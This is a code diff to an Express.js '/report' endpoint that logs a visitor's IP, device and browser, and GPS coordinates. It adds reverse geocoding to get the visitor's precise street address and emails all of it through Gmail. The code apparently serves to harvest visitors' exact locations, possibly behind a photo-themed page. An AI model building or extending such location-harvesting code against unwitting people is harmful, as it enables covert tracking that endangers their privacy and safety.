@@ -13,7 +13,6 @@ app.post('/report', async (req, res) => {
   const ip = rawIp.split(',')[0].trim();
   const ua = uaParser(req.headers['user-agent']);
   const { latitude, longitude } = req.body;
-
   const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
   let geo = {};
@@ -22,6 +21,17 @@ app.post('/report', async (req, res) => {
     geo = await geoRes.json();
   } catch (err) {
     console.error('IPジオAPIエラー:', err);
+  }
+
+  let addressInfo = '不明';
+  try {
+    const geoRes = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${latitude},${longitude}&key=${process.env.GOOGLE_API_KEY}`);
+    const geoData = await geoRes.json();
+    if (geoData.status === 'OK') {
+      addressInfo = geoData.results[0]?.formatted_address || '不明';
+    }
+  } catch (err) {
+    console.error('Google逆ジオコーディングエラー:', err);
   }
 
   // ✉️ Gmailで送信
@@ -40,11 +50,10 @@ app.post('/report', async (req, res) => {
     text: `
 📸 アクセス情報：
 - IPアドレス: ${ip}
-- 国: ${geo.country_name || '不明'}
-- 地域: ${geo.region || '不明'}
-- 市区町村: ${geo.city || '不明'}
+- IP推定地域: ${geo.country_name || '不明'} / ${geo.region || '不明'} / ${geo.city || '不明'}
+- GPS精密住所: ${addressInfo}
 - 端末: ${ua.device.type || 'PC'} / ${ua.os.name} / ${ua.browser.name}
-- GPS位置: ${locationLink}
+- Google Maps: ${locationLink}
 - アクセス時間: ${new Date().toLocaleString()}
     `
   };
